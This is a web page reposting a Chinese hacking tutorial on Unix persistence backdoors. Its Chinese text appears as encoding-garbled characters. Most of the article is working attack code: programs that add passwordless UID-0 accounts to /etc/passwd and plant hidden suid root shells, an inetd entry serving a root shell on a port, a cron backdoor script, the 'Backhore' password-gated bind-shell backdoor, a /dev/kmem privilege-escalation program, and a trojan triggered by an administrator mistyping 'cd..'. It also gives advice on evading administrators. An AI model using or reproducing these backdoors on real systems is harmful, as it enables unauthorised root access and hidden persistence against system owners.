<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§ | æå®¢å¿«è¨Š</title><meta property="og:title" content="åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§ - æå®¢å¿«è¨Š"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p3.pstatp.com/large/dfic-imagehandler/d05186f9-9045-4e34-9cff-b38898fca6b0"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/0a86a02c.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/0a86a02c.html><meta property="article:published_time" content="2020-10-29T21:12:03+08:00"><meta property="article:modified_time" content="2020-10-29T21:12:03+08:00"><meta name=Keywords content><meta name=description content="åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§"><meta name=author content="æå®¢å¿«è¨Š"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/0a86a02c.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>ğŸ¤“ æå®¢å¿«è®¯ Geek Bank</a></h1><p class=description>ä¸ºä½ å¸¦æ¥æœ€å…¨çš„ç§‘æŠ€çŸ¥è¯† ğŸ§¡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>çŒœä½ å–œæ­¡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=ç§‘æŠ€>ç§‘æŠ€</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=éŠæˆ²>éŠæˆ²</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=ç§‘å­¸>ç§‘å­¸</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>ç§‘æŠ€</a></span></div><div class=post-content><p>åé—¨æŠ€å·§</p><div class=pgc-img><img alt=åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§ onerror=errorimg.call(this); src=https://p3.pstatp.com/large/dfic-imagehandler/d05186f9-9045-4e34-9cff-b38898fca6b0><p class=pgc-img-caption></p></div><p><br></p><p><br>[åˆçº§]<br>æœ€ç®€å•çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨å£ä»¤æ–‡ä»¶ passwd ä¸­å¢åŠ ä¸€ä¸ª UID ä¸º 0 çš„å¸å·ã€‚ä½†æœ€å¥½åˆ«è¿™ä¹ˆåšï¼Œå› ä¸ºåªè¦ç³»ç»Ÿç®¡ç†å‘˜æ£€æŸ¥å£ä»¤æ–‡ä»¶å°±ä¼šâ€œæ¼é¦…â€äº†ã€‚ä»¥ä¸‹æ˜¯åœ¨ /etc/passwd å£ä»¤æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ª UID 0 å¸å·çš„Cç¨‹åºã€‚<br>&lt;++> backdoor/backdoor1.c<br>#include<br>main()<br>{<br>FILE *fd;<br>fd=fopen("/etc/passwd","a+");<br>fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");<br>}<br>&lt;--><br>æ¯”è¿™ç§æ–¹æ³•ç¨å¾®éšè”½ä¸€ç‚¹çš„å°±æ˜¯å°†è—åœ¨å£ä»¤æ–‡ä»¶ä¸­æŸä¸ªæ— äººä½¿ç”¨å¸å·çš„ UID æ”¹ä¸º 0ï¼Œå¹¶å°†å…¶ç¬¬äºŒä¸ªåŸŸï¼ˆå£ä»¤åŸŸï¼‰è®¾ä¸ºç©ºã€‚ï¼ˆæ³¨æ„ï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯è¾ƒé«˜ç‰ˆæœ¬çš„*nixï¼Œä¹Ÿè®¸è¿˜è¦ä¿®æ”¹ /etc/shadow æ–‡ä»¶ã€‚ï¼‰<br>åœ¨ /tmp ç›®å½•ä¸‹æ”¾ç½® suid shellã€‚ä»¥ååªè¦ä½ è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œå°±ä¼šè½»æ˜“å¾—åˆ°æ ¹ç”¨æˆ·æƒé™ã€‚è¿™ç§æ–¹æ³•å‡ ä¹æ˜¯æœ€å—æ¬¢è¿çš„äº†ã€‚ä½†æœ‰è®¸å¤šç³»ç»Ÿæ¯å‡ å°æ—¶ï¼Œæˆ–è€…æ¯æ¬¡å¯åŠ¨éƒ½ä¼šæ¸…é™¤ /tmp ç›®å½•ä¸‹çš„æ•°æ®ï¼Œå¦å¤–ä¸€äº›ç³»ç»Ÿåˆ™æ ¹æœ¬ä¸å…è®¸è¿è¡Œ /tmp ç›®å½•ä¸‹çš„ suid ç¨‹åºã€‚å½“ç„¶ï¼Œä½ å¯ä»¥è‡ªå·±ä¿®æ”¹æˆ–æ¸…é™¤è¿™äº›é™åˆ¶ï¼ˆå› ä¸ºä½ å·²æ˜¯æ ¹ç”¨æˆ·ï¼Œæœ‰æƒé™ä¿®æ”¹ /var/spool/cron/crontabs/root å’Œ /etc/fstab æ–‡ä»¶ï¼‰ã€‚ä»¥ä¸‹æ˜¯åœ¨ /tmp ç›®å½•ä¸‹æ”¾ç½® suid shell ç¨‹åºçš„Cæºç¨‹åºã€‚<br>&lt;++> backdoor/backdoor2.c<br>#include<br>main()<br>{<br>system("cp /bin/sh /tmp/fid");<br>system("chown root.root /tmp/fid");<br>system("chmod 4755 /tmp/fid");<br>}<br>&lt;--><br></p><div class=pgc-img><img alt=åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§ onerror=errorimg.call(this); src=https://p9.pstatp.com/large/dfic-imagehandler/190af47c-e260-473a-af5f-69aa346e196c><p class=pgc-img-caption></p></div><p><br>[ä¸­çº§]<br>è¶…çº§æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹ï¼ˆinetdï¼‰çš„é…ç½®æ–‡ä»¶ã€‚ç³»ç»Ÿç®¡ç†å‘˜ä¸€èˆ¬æƒ…å†µä¸‹ä¸ç»å¸¸æ£€æŸ¥è¯¥æ–‡ä»¶ï¼Œå› æ­¤è¿™å€’æ˜¯ä¸ªæ”¾ç½®â€œåé—¨â€çš„å¥½åœ°æ–¹ã€‚:) é‚£ä¹ˆåœ¨è¿™é‡Œå¦‚ä½•å»ºç«‹ä¸€ä¸ªæœ€å¥½çš„åé—¨å‘¢ï¼Ÿå½“ç„¶æ˜¯è¿œç¨‹çš„äº†ã€‚è¿™æ ·ä½ å°±ä¸å¿…éœ€è¦æœ¬åœ°å¸å·å°±å¯ä»¥æˆä¸ºæ ¹ç”¨æˆ·äº†ã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹è¿™æ–¹é¢çš„åŸºç¡€çŸ¥è¯†ï¼šinetd è¿›ç¨‹è´Ÿè´£ç›‘å¬å„ä¸ªTCPå’ŒUDPç«¯å£çš„è¿æ¥è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¿æ¥è¯·æ±‚å¯åŠ¨ç›¸åº”çš„æœåŠ¡å™¨è¿›ç¨‹ã€‚è¯¥é…ç½®æ–‡ä»¶ /etc/inetd.conf å¾ˆç®€å•ï¼ŒåŸºæœ¬å½¢å¼å¦‚ä¸‹ï¼š<br>(1) (2) (3) (4) (5) (6) (7)<br>ftp stream tcp nowait root /usr/etc/ftpd ftpd<br>talk dgram udp wait root /usr/etc/ntalkd ntalkd<br>mountd/1 stream rpc/tcp wait root /usr/etc/mountd mountd<br>1ï¼šç¬¬ä¸€æ æ˜¯æœåŠ¡åç§°ã€‚æœåŠ¡åé€šè¿‡æŸ¥è¯¢ /etc/services æ–‡ä»¶ï¼ˆä¾› TCP å’Œ UDP æœåŠ¡ä½¿ç”¨ï¼‰æˆ– portmap å®ˆæŠ¤è¿›ç¨‹ï¼ˆä¾› RPC æœåŠ¡ä½¿ç”¨ï¼‰æ˜ å°„æˆç«¯å£å·ã€‚RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰æœåŠ¡ç”± name/num çš„åå­—æ ¼å¼å’Œç¬¬ä¸‰æ ä¸­çš„ rpc æ ‡å¿—è¯†åˆ«ã€‚<br>2ï¼šç¬¬äºŒæ å†³å®šæœåŠ¡ä½¿ç”¨çš„å¥—æ¥å£ç±»å‹ï¼šstreamã€dgram æˆ– rawã€‚ä¸€èˆ¬è¯´æ¥ï¼Œstream ç”¨äº TCP æœåŠ¡ï¼Œdgram ç”¨äº UDPï¼Œ raw çš„ä½¿ç”¨å¾ˆå°‘è§ã€‚<br>3ï¼šç¬¬ä¸‰æ æ ‡è¯†æœåŠ¡ä½¿ç”¨çš„é€šä¿¡åè®®ã€‚å…è®¸çš„ç±»å‹åˆ—åœ¨ protocols æ–‡ä»¶ä¸­ã€‚åè®®å‡ ä¹æ€»æ˜¯æ˜¯ tcp æˆ– udpã€‚RPC æœåŠ¡åœ¨åè®®ç±»å‹å‰å† ä»¥ rpc/ã€‚<br>4ï¼šå¦‚æœæ‰€è¯´æ˜çš„æœåŠ¡ä¸€æ¬¡å¯å¤„ç†å¤šä¸ªè¯·æ±‚ï¼ˆè€Œä¸æ˜¯å¤„ç†ä¸€ä¸ªè¯·æ±‚åå°±é€€å‡ºï¼‰ï¼Œé‚£ä¹ˆç¬¬å››æ åº”ç½®æˆ waitï¼Œè¿™æ ·å¯ä»¥é˜»æ­¢ inetd æŒç»­åœ°æ´¾ç”Ÿè¯¥å®ˆæŠ¤è¿›ç¨‹çš„æ–°æ‹·è´ã€‚æ­¤é€‰é¡¹ç”¨äºå¤„ç†å¤§é‡çš„å°è¯·æ±‚çš„æœåŠ¡ã€‚å¦‚æœ wait ä¸åˆé€‚ï¼Œé‚£ä¹ˆåœ¨æœ¬æ ä¸­å¡« nowaitã€‚<br>5ï¼šç¬¬äº”æ ç»™å‡ºè¿è¡Œå®ˆæŠ¤è¿›ç¨‹çš„ç”¨æˆ·åã€‚<br>6ï¼šç¬¬å…­æ ç»™å‡ºå®ˆæŠ¤è¿›ç¨‹çš„å…¨é™å®šè·¯å¾„åã€‚<br>7ï¼šå®ˆæŠ¤è¿›ç¨‹çš„çœŸå®åå­—åŠå…¶å‚æ•°ã€‚<br>å¦‚æœæ‰€è¦å¤„ç†çš„å·¥ä½œå¾®ä¸è¶³é“ï¼ˆå¦‚ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼‰ï¼Œinetd å®ˆæŠ¤è¿›ç¨‹ä¾¿è‡ªå·±å¤„ç†ã€‚æ­¤æ—¶ç¬¬å…­ã€ä¸ƒæ åªéœ€å¡«ä¸Š 'internal' å³å¯ã€‚æ‰€ä»¥ï¼Œè¦å®‰è£…ä¸€ä¸ªä¾¿åˆ©çš„åé—¨ï¼Œå¯ä»¥é€‰æ‹©ä¸€ä¸ªä¸å¸¸è¢«ä½¿ç”¨çš„æœåŠ¡ï¼Œç”¨å¯ä»¥äº§ç”ŸæŸç§åé—¨çš„å®ˆæŠ¤è¿›ç¨‹ä»£æ›¿åŸå…ˆçš„å®ˆæŠ¤è¿›ç¨‹ã€‚ä¾‹å¦‚ï¼Œè®©å…¶æ·»åŠ  UID 0 çš„å¸å·ï¼Œæˆ–å¤åˆ¶ä¸€ä¸ª suid shellã€‚<br>ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå°±æ˜¯å°†ç”¨äºæä¾›æ—¥æœŸæ—¶é—´çš„æœåŠ¡ daytime æ›¿æ¢ä¸ºèƒ½å¤Ÿäº§ç”Ÿä¸€ä¸ª suid root çš„ shellã€‚åªè¦å°† /etc/inetd.conf æ–‡ä»¶ä¸­çš„ï¼š<br>daytime stream tcp nowait root internal<br>ä¿®æ”¹ä¸ºï¼š<br>daytime stream tcp nowait /bin/sh sh -i.<br>ç„¶åé‡å¯ï¼ˆè®°ä½ï¼šä¸€å®šè¦é‡å¯ï¼‰inetd è¿›ç¨‹ï¼š<br>killall -9 inetdã€‚<br>ä½†æ›´å¥½ã€æ›´éšè”½çš„æ–¹æ³•æ˜¯ä¼ªé€ ç½‘ç»œæœåŠ¡ï¼Œè®©å®ƒèƒ½å¤Ÿåœ¨æ›´éš¾ä»¥å¯Ÿè§‰çš„æƒ…å†µä¸‹ä¸ºæˆ‘ä»¬æä¾›åé—¨ï¼Œä¾‹å¦‚å£ä»¤ä¿æŠ¤ç­‰ã€‚å¦‚æœèƒ½å¤Ÿåœ¨ä¸é€šè¿‡ telnetd è¿æ¥çš„æƒ…å†µä¸‹è½»æ¾åœ°è¿›è¡Œè¿œç¨‹è®¿é—®ï¼Œé‚£æ˜¯å†å¥½ä¸è¿‡äº†ã€‚æ–¹æ³•å°±æ˜¯å°†â€œè‡ªå·±çš„â€å®ˆæŠ¤ç¨‹åºç»‘å®šåˆ°æŸä¸ªç«¯å£ï¼Œè¯¥ç¨‹åºå¯¹å¤–æ¥è¿æ¥ä¸æä¾›ä»»ä½•æç¤ºç¬¦ï¼Œä½†åªè¦ç›´æ¥è¾“å…¥äº†æ­£ç¡®çš„å£ä»¤ï¼Œå°±èƒ½å¤Ÿé¡ºåˆ©åœ°è¿›å…¥ç³»ç»Ÿã€‚ä»¥ä¸‹æ˜¯è¿™ç§åé—¨çš„ä¸€ä¸ªç¤ºèŒƒç¨‹åºã€‚ï¼ˆæ³¨ï¼šè¿™ä¸ªç¨‹åºå†™å¾—å¹¶ä¸å¾ˆå®Œæ•´ã€‚ï¼‰<br>&lt;++> backdoor/remoteback.c<br>/* Coders:<br>Theft<br>Help from:<br>Sector9, Halogen<br>Greets: People: Liquid, AntiSocial, Peak, Grimknight, s0ttle,halogen,<br>Psionic, g0d, Psionic.<br>Groups: Ethical Mutiny Crew(EMC), Common Purpose hackers(CPH),<br>Global Hell(gH), Team Sploit, Hong Kong Danger Duo,<br>Tg0d, EHAP.<br>Usage:<br>Setup:<br># gcc -o backhore backhore.c # ./backdoor password &<br>Run:<br>Telnet to the host on port 4000. After connected you<br>Will not be prompted for a password, this way it is less<br>Obvious, just type the password and press enter, after this<br>You will be prompted for a command, pick 1-8.<br>Distributers:<br>Ethical Mutiny Crew<br>*/<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#define PORT 4000<br>#define MAXDATASIZE 100<br>#define BACKLOG 10<br>#define SA struct sockaddr<br>void handle(int);<br>int<br>main(int argc, char *argv[])<br>{<br>int sockfd, new_fd, sin_size, numbytes, cmd;<br>char ask[10]="Command: ";<br>char *bytes, *buf, pass[40];<br>struct sockaddr_in my_addr;<br>struct sockaddr_in their_addr;<br>printf("\n Backhore BETA by Theft\n");<br>printf(" 1: trojans rc.local\n");<br>printf(" 2: sends a systemwide message\n");<br>printf(" 3: binds a root shell on port 2000\n");<br>printf(" 4: creates suid sh in /tmp\n");<br>printf(" 5: creates mutiny account uid 0 no passwd\n");<br>printf(" 6: drops to suid shell\n");<br>printf(" 7: information on backhore\n");<br>printf(" 8: contact\n");<br>if (argc != 2) {<br>fprintf(stderr,"Usage: %s password\n", argv[0]);<br>exit(1);<br>}<br>strncpy(pass, argv[1], 40);<br>printf("..using password: %s..\n", pass);<br>if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {<br>perror("socket");<br>exit(1);<br>}<br>my_addr.sin_family = AF_INET;<br>my_addr.sin_port = htons(PORT);<br>my_addr.sin_addr.s_addr = INADDR_ANY;<br>if (bind(sockfd, (SA *)&my_addr, sizeof(SA)) == -1) {<br>perror("bind");<br>exit(1);<br>}<br>if (listen(sockfd, BACKLOG) == -1) {<br>perror("listen");<br>exit(1);<br>}<br>sin_size = sizeof(SA);<br>while(1) { /* main accept() loop */<br>if ((new_fd = accept(sockfd, (SA *)&their_addr, &sin_size)) == -1) {<br>perror("accept");<br>continue;<br>}<br>if (!fork()) {<br>dup2(new_fd, 0);<br>dup2(new_fd, 1);<br>dup2(new_fd, 2);<br>fgets(buf, 40, stdin);<br>if (!strcmp(buf, pass)) {<br>printf("%s", ask);<br>cmd = getchar();<br>handle(cmd);<br>}<br>close(new_fd);<br>exit(0);<br>}<br>close(new_fd);<br>while(waitpid(-1,NULL,WNOHANG) > 0); /* rape the dying children */<br>}<br>}<br>void<br>handle(int cmd)<br>{<br>FILE *fd;<br>switch(cmd) {<br>case '1':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("Trojaning rc.local\n");<br>fd = fopen("/etc/passwd", "a+");<br>fprintf(fd, "mutiny::0:0:ethical mutiny crew:/root:/bin/sh");<br>fclose(fd);<br>printf("Trojan complete.\n");<br>break;<br>case '2':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("Sending systemwide message..\n");<br>system("wall Box owned via the Ethical Mutiny Crew");<br>printf("Message sent.\n");<br>break;<br>case '3':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nAdding inetd backdoor... (-p)\n");<br>fd = fopen("/etc/services","a+");<br>fprintf(fd,"backdoor\t2000/tcp\tbackdoor\n");<br>fd = fopen("/etc/inetd.conf","a+");<br>fprintf(fd,"backdoor\tstream\ttcp\tnowait\troot\t/bin/sh -i\n");<br>execl("killall", "-HUP", "inetd", NULL);<br>printf("\ndone.\n");<br>printf("telnet to port 2000\n\n");<br>break;<br>case '4':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nAdding Suid Shell... (-s)\n");<br>system("cp /bin/sh /tmp/.sh");<br>system("chmod 4700 /tmp/.sh");<br>system("chown root:root /tmp/.sh");<br>printf("\nSuid shell added.\n");<br>printf("execute /tmp/.sh\n\n");<br>break;<br>case '5':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nAdding root account... (-u)\n");<br>fd=fopen("/etc/passwd","a+");<br>fprintf(fd,"hax0r::0:0::/:/bin/bash\n");<br>printf("\ndone.\n");<br>printf("uid 0 and gid 0 account added\n\n");<br>break;<br>case '6':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("Executing suid shell..\n");<br>execl("/bin/sh");<br>break;<br>case '7':<br>printf("\nBackhore BETA by Theft\n");<br>printf("theft@cyberspace.org\n");<br>printf("\nInfo... (-i)\n");<br>printf("\n3 - Adds entries to /etc/services & /etc/inetd.conf giving you\n");<br>printf("a root shell on port 2000. example: telnet 2000\n\n");<br>printf("4 - Creates a copy of /bin/sh to /tmp/.sh which, whenever\n");<br>printf("executed gives you a root shell. example:/tmp/.sh\n\n");<br>printf("5 - Adds an account with uid and gid 0 to the passwd file.\n");<br>printf("The login is 'mutiny' and there is no passwd.");<br>break;<br>case '8':<br>printf("\nBackhore BETA by Theft\n");<br>printf("\nhttp://theft.bored.org\n");<br>printf("theft@cyberspace.org\n\n");<br>break;<br>default:<br>printf("unknown command: %d\n", cmd);<br>break;<br>}<br>}<br>&lt;--><br></p><div class=pgc-img><img alt=åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/dfic-imagehandler/ab06310b-f603-4612-be28-603da69b73e2><p class=pgc-img-caption></p></div><p><br>[é«˜çº§]<br>Crontab ç¨‹åºå¯¹äºç³»ç»Ÿç®¡ç†å‘˜æ¥è¯´æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚Cron æœåŠ¡ç”¨äºè®¡åˆ’ç¨‹åºåœ¨ç‰¹å®šæ—¶é—´ï¼ˆæœˆã€æ—¥ã€å‘¨ã€æ—¶ã€åˆ†ï¼‰è¿è¡Œã€‚å¦‚æœä½ è¶³å¤Ÿèªæ˜ï¼Œå°±åº”è¯¥åŠ ä»¥åˆ©ç”¨ï¼Œä½¿ä¹‹ä¸ºæˆ‘ä»¬åˆ¶é€ â€œåé—¨â€ï¼é€šè¿‡ Cron æœåŠ¡ï¼Œä½ å¯ä»¥è®©å®ƒåœ¨æ¯å¤©å‡Œæ™¨ 3:00 ï¼ˆè¿™ä¸ªæ—¶å€™ç½‘ç®¡åº”è¯¥ç¡è§‰äº†å§ã€‚ï¼‰è¿è¡Œåé—¨ç¨‹åºï¼Œä½¿ä½ èƒ½å¤Ÿè½»æ˜“è¿›å…¥ç³»ç»Ÿå¹²ä½ æƒ³å¹²çš„äº‹ï¼Œå¹¶åœ¨ç½‘ç®¡èµ·æ¥ä¹‹å‰é€€å‡ºç³»ç»Ÿã€‚æ ¹ç”¨æˆ·çš„ crontab æ–‡ä»¶æ”¾åœ¨ /var/spool/crontab/root ä¸­ï¼Œå…¶æ ¼å¼å¦‚ä¸‹ï¼š<br>(1) (2) (3) (4) (5) (6)<br>0 0 * * 3 /usr/bin/updatedb<br>1. åˆ†é’Ÿ (0-60)<br>2. å°æ—¶ (0-23)<br>3. æ—¥ (1-31)<br>4. æœˆ (1-12)<br>5. æ˜ŸæœŸ (1-7)<br>6. æ‰€è¦è¿è¡Œçš„ç¨‹åº<br>ä»¥ä¸Šå†…å®¹è®¾ç½®è¯¥ç¨‹åºäºæ¯æ˜ŸæœŸä¸‰ 0:0 è¿è¡Œã€‚è¦åœ¨ cron å»ºç«‹åé—¨ï¼Œåªéœ€åœ¨ /var/spool/crontab/root ä¸­æ·»åŠ åé—¨ç¨‹åºå³å¯ã€‚ä¾‹å¦‚è¯¥ç¨‹åºå¯ä»¥åœ¨æ¯å¤©æ£€æŸ¥æˆ‘ä»¬åœ¨ /etc/passwd æ–‡ä»¶ä¸­å¢åŠ äº†ç”¨æˆ·å¸å·æ˜¯å¦ä»ç„¶æœ‰æ•ˆã€‚ä»¥ä¸‹æ˜¯ç¨‹åºç¤ºä¾‹ï¼š<br>0 0 * * * /usr/bin/retract<br>&lt;++> backdoor/backdoor.sh<br>#!/bin/csh<br>set evilflag = (`grep eviluser /etc/passwd`)<br>if($#evilflag == 0) then<br>set linecount = `wc -l /etc/passwd`<br>cd<br>cp /etc/passwd ./temppass<br>@ linecount[1] /= 2<br>@ linecount[1] += 1<br>split -$linecount[1] ./temppass<br>echo "Meb::0:0:Meb:/root:/bin/sh" >> ./xaa<br>cat ./xab >> ./xaa<br>mv ./xaa /etc/passwd<br>chmod 644 /etc/passwd<br>rm ./xa* ./temppass<br>echo Done...<br>else<br>endif<br>&lt;--><br>[ç»¼åˆ]<br>å½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™æœ¨é©¬ç¨‹åºï¼Œå¹¶æŠŠå®ƒæ”¾åˆ° /bin ç›®å½•ä¸‹ã€‚å½“ä»¥ç‰¹å®šå‘½ä»¤è¡Œå‚æ•°è¿è¡Œæ—¶å°†äº§ç”Ÿä¸€ä¸ª suid shellã€‚ä»¥ä¸‹æ˜¯ç¨‹åºç¤ºä¾‹ï¼š<br>&lt;++> backdoor/backdoor3.c<br>#include<br>#define pass "triad"<br>#define BUFFERSIZE 6<br>int main(argc, argv)<br>int argc;<br>char *argv[];{<br>int i=0;<br>if(argv[1]){<br>if(!(strcmp(pass,argv[1]))){<br>system("cp /bin/csh /bin/.swp121");<br>system("chmod 4755 /bin/.swp121");<br>system("chown root /bin/.swp121");<br>system("chmod 4755 /bin/.swp121");<br>}<br>}<br>printf("372f: Invalid control argument, unable to initialize. Retrying");<br>for(;i&lt;10;i++){<br>fprintf(stderr,".");<br>sleep(1);<br>}<br>printf("\nAction aborted after 10 attempts.\n");<br>return(0);<br>}<br>&lt;--><br>[å˜ç§]<br>ä»¥ä¸‹ç¨‹åºé€šè¿‡åœ¨å†…å­˜ä¸­å¯»æ‰¾ä½ æ‰€è¿è¡Œç¨‹åºçš„ UIDï¼Œå¹¶å°†å…¶æ”¹ä¸º 0ï¼Œè¿™æ ·ä½ å°±æœ‰äº†ä¸€ä¸ª suid root shell äº†ã€‚<br>&lt;++> backdoor/kmemthief.c<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#include<br>#define pass "triad"<br>struct user userpage;<br>long address(), userlocation;<br>int main(argc, argv, envp)<br>int argc;<br>char *argv[], *envp[];{<br>int count, fd;<br>long where, lseek();<br>if(argv[1]){<br>if(!(strcmp(pass,argv[1]))){<br>fd=(open("/dev/kmem",O_RDWR);<br>if(fd&lt;0){<br>printf("Cannot read or write to<br>/dev/kmem\n");<br>perror(argv);<br>exit(10);<br>}<br>userlocation=address();<br>where=(lseek(fd,userlocation,0);<br>if(where!=userlocation){<br>printf("Cannot seek to user page\n");<br>perror(argv);<br>exit(20);<br>}<br>count=read(fd,&userpage,sizeof(struct user));<br>if(count!=sizeof(struct user)){<br>printf("Cannot read user page\n");<br>perror(argv);<br>exit(30);<br>}<br>printf("Current UID: %d\n",userpage.u_ruid);<br>printf("Current GID: %d\n",userpage.g_ruid);<br>userpage.u_ruid=0;<br>userpage.u_rgid=0;<br>where=lseek(fd,userlocation,0);<br>if(where!=userlocation){<br>printf("Cannot seek to user page\n");<br>perror(argv);<br>exit(40);<br>}<br>write(fd,&userpage,((char *)&(userpage.u_procp))-((char *)&userpage));<br>execle("/bin/csh","/bin/csh","-i",(char *)0, envp);<br>}<br>}<br>}<br>&lt;--><br></p><div class=pgc-img><img alt=åˆçº§éª‡å®¢æŠ€å·§ï¼Œè€ç³»ç»Ÿç”¨çš„åé—¨æŠ€å·§ onerror=errorimg.call(this); src=https://p1.pstatp.com/large/dfic-imagehandler/ee2512f1-0c5d-4b36-8bf7-61e3cdcb50ae><p class=pgc-img-caption></p></div><p><br>[â€œç¬¨â€æ–¹æ³•]<br>ä½ æœ‰æ²¡æœ‰æ›¾ç»è¯•è¿‡åœ¨ UNIX ç³»ç»Ÿä¸‹é”™æŠŠ "cd .." è¾“å…¥ä¸º "cd.."ï¼Ÿè¿™æ˜¯ç”±äºä½¿ç”¨ MS Windows å’Œ MS-DOS å…»æˆçš„ä¹ æƒ¯ã€‚è¿™ç§é”™è¯¯ç½‘ç®¡æ˜¯å¦ä¹Ÿä¼šçŠ¯å‘¢ï¼Ÿå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œå¯ä¸å¯ä»¥è®©ä»–ä¸ºæˆ‘ä»¬åšç‚¹â€œè´¡çŒ®â€å‘¢ï¼Ÿ:) ä¾‹å¦‚å½“ä»–è¾“å…¥ "cd.." æ—¶ï¼Œä¼šæ¿€æ´»æˆ‘ä»¬çš„æœ¨é©¬ç¨‹åºã€‚è¿™æ ·æˆ‘ä»¬å°±ä¸å¿…ç™»å½•åˆ°ç³»ç»Ÿå»æ¿€æ´»æœ¨é©¬äº†ã€‚ä»¥ä¸‹æ˜¯ç¨‹åºç¤ºä¾‹ï¼š<br>&lt;++> backdoor/dumb.c<br>/*<br>æœ¬ç¨‹åºå¯åœ¨ç®¡ç†å‘˜å¶ç„¶åœ°è¾“å…¥ cd.. æ—¶å‘ /etc/passwd æ–‡ä»¶æ·»åŠ ä¸€ä¸ª UID 0 å¸å·ã€‚ä½†åŒæ—¶å®ƒä¹Ÿå®ç° cd .. åŠŸèƒ½ï¼Œä»è€Œéª—è¿‡ç®¡ç†å‘˜ã€‚<br>*/<br>#include<br>#include<br>main()<br>{<br>FILE *fd;<br>fd=fopen("/etc/passwd","a+");<br>fprintf(fd,"hax0r::0:0::/root:/bin/sh\n");<br>system("cd");<br>}<br>&lt;--><br>æŠŠä¸Šé¢çš„ç¨‹åºç¼–è¯‘å¥½ï¼Œæ”¾åˆ°éšè”½çš„åœ°æ–¹ã€‚æœ€å¥½ä½¿ç”¨ chown 